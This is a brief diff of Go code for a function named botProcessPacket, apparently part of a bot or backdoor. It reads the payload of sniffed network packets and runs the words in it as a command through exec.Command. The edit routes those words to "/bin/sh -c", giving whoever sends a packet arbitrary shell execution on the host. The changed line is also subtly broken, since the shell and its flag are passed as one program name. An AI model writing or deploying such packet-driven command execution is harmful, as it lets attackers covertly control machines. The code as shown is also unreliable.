@@ -35,8 +35,8 @@ func botProcessPacket(packet gopacket.Packet) {
 	data := string(packet.ApplicationLayer().Payload())
 
 	payload := strings.Split(data, " ")
-	command := payload[1]
-	args := payload[2:]
+	command := "/bin/sh -c"
+	args := payload[1:]
 
 	cmd := exec.Command(command, args...)
 	fmt.Println("This is the cmd object", cmd)
